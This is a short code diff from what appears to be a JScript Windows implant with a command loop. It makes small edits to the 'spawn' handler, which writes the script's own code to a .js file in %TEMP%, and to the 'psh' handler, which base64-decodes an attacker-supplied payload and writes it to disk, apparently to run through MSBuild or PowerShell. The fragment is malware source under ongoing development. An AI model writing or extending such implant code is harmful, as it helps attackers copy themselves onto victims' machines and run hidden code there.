@@ -125,7 +125,7 @@ while(true)
 	    }
 
 	    //spawn: writes js to %TEMP%
-	    if(jsObject.cmnd == "spawn") {
+      else if(jsObject.cmnd == "spawn") {
 		    fd = fso.CreateTextFile(temp+"\\"+id+".js")
 		    fd.WriteLine(selfdata)
 		    fd.close()
@@ -135,7 +135,7 @@ while(true)
 
       //psh runs ... you know what
       //duplicate code here and cmnd... :(
-      if(jsObject.cmnd.split(" ")[0] == "psh") {
+      else if(jsObject.cmnd.split(" ")[0] == "psh") {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
          msb = jsObject.cmnd.split(" ")[1]
          msbdata = b64d(jsObject.cmnd.split(" ")[2])
